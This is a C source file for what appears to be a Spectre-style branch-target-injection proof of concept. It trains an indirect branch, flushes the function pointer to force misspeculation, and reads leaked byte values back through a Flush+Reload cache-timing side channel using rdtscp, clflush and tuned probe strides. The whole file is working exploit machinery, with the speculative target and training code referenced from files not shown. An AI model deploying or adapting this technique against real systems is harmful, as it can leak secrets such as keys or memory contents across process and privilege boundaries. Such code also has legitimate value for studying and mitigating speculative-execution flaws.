#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include "common.h"

// Defines the bandwidth we can communicate
// from speculative -> von neuman
// e.g. 256 would be 1 byte of info
// Tradeoff here is larger bandwidth means we have
// to check more places in probe_buf (and flush them)
#define NUM_PROBES 256
#define DECRYPT_LEN 256

// These define the stride length we take between probes
// This thwarts a clever CPU's stride prediction
// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
// Generally, this results in not seeing ANY winning probes
// in which case, we change cur_probe_space and retry
#define MAX_PROBE_SPACE (1000003)
double avgpct = 0;
uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;


// The (heap-allocated) probe buffer
// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
// in the cache to communicate the value i from speculative -> von neuman
uint8_t __attribute__((section(".probe_buf"))) *probe_buf;


// This is a simple counter, accessed by the speculative function (target_fn)
// so it can compute on it.
uint16_t signal_idx = 0;
uint64_t instr = 0;


// Stats
uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
uint64_t tot_time = 0;      // Number cycles total

unsigned int junk=0;    // For rdtscp


void *map;
#define TARGET_FN_ADDR 0x414100401000

// We define this function in assembly (target_fn.S)
// It is never called directly (essentially dead code)
// However, indirect.c trains the processor to think the indirect
// jump in common.c::indirect() is going to call this function
// We flush the fn_ptr used by indirect(), forcing the CPU to
// (mis)speculate and start processing this function.
// In reality, the CPU will (eventually) call check_probes()
// where we collect results and see what's in cache
void target_fn(void) __attribute__((section(".targetfn")));
void end_target_fn(void);
void end_target_fn2(void);

uint64_t results[NUM_PROBES];

void check_probes() {
    uint64_t t0, t1;
    uint8_t *addr;

    int i;
    for (i=0; i<NUM_PROBES; i++) {
        addr = &probe_buf[i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[i]++;
            //printf("# %lu\n", t1-t0);
            //_mm_clflush(addr);
        }
    }
    tot_runs++;

    // Clear probe_buf from cache
    for (i=0; i<NUM_PROBES; i++) {
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }
}


void nop ()
{

}

void setup_indirect(uint64_t ctr);

void measure() {
    fn_ptr = check_probes;
    jmp_ptr = 0;
    int i;

    int misses = 0;
    uint64_t last_i = 0xff;

    while (1) {
        for (i=0; i<2000; i++) {
            _mm_clflush(&fn_ptr);
            //_mm_clflush(&jmp_ptr);
            //indirect(&jmp_ptr);
            setup_indirect(0);
            usleep(1);
        }
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;

        uint64_t max_res=0, max_i=0;
        for (i=0; i<NUM_PROBES; i++) {
            if (results[i]>max_res) {
                max_res = results[i];
                max_i = i;
            }
        }

        if (max_res > 10 && avg < 55){
            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
                     max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
            avgpct += ((float)max_res)/tot_runs;

            last_i = max_i;
            signal_idx++;
            instr++;
            misses = 0;
            if (signal_idx > DECRYPT_LEN) {
                avgpct /= DECRYPT_LEN;
                avgpct *= 100;
                printf("total avg hit rate = %0.5f%%\n", avgpct);
                exit(0);
            }

        } else {
            printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
            misses++;
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;

        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        //signal_idx %= NUM_PROBES;
        usleep(10);
    }


}

int main()
{
    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    printf("probe_buf @%p\n", probe_buf);
    int i =0;
    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }


    // TODO: Don't forget to load code into icache!!!


    measure();

}
